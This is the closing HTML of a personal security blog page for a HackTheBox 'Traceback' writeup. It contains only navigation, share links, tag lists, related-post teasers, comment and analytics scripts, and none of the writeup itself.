href="https://twitter.com/intent/tweet?text=Hackthebox Traceback writeup - 0xPrashant&url=http://localhost:4000/posts/htb-traceback/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Traceback writeup - 0xPrashant&u=http://localhost:4000/posts/htb-traceback/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Traceback writeup - 0xPrashant&url=http://localhost:4000/posts/htb-traceback/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blackfield/"><div class="card-body"> <span class="timeago small" > Jun 9 <i class="unloaded">2020-06-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blackfield writeup</h3><div class="text-muted small"><p> Introduction@Blackfield:~$ Column Details Name Blackfield IP 10.10.10.192 Points 40 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-oouch/" class="btn btn-outline-primary"><p>Hackthebox Oouch writeup</p></a> <a href="/posts/htb-remote/" class="btn btn-outline-primary"><p>Hackthebox Remote writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-traceback/'; this.page.identifier = '/posts/htb-traceback/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
